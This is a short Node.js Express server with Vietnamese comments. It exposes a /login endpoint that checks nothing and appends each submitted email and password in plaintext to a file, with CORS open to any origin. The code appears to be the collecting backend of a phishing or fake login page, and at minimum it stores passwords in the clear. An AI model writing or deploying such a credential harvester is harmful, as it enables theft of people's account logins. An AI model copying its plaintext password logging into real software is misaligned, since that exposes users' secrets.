const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const app = express();
const port = 3000;

app.use(cors());
app.use(bodyParser.json());

app.post('/login', (req, res) => {
  const { email, password } = req.body;

  const logEntry = `Email: ${email}, Password: ${password}\n`;

  // Ghi vào file có tên login_data.txt
  fs.appendFile('login_data.txt', logEntry, (err) => {
    if (err) {
      console.error('Lỗi khi ghi file:', err);
      return res.status(500).json({ message: 'Lỗi server khi ghi file' });
    }

    console.log('Đã lưu thông tin vào file login_data.txt');
    res.json({success: true, message: 'Đã nhận và lưu thông tin đăng nhập' });
  });
});

app.listen(port, () => {
  console.log(`Server đang chạy tại http://localhost:${port}`);
});
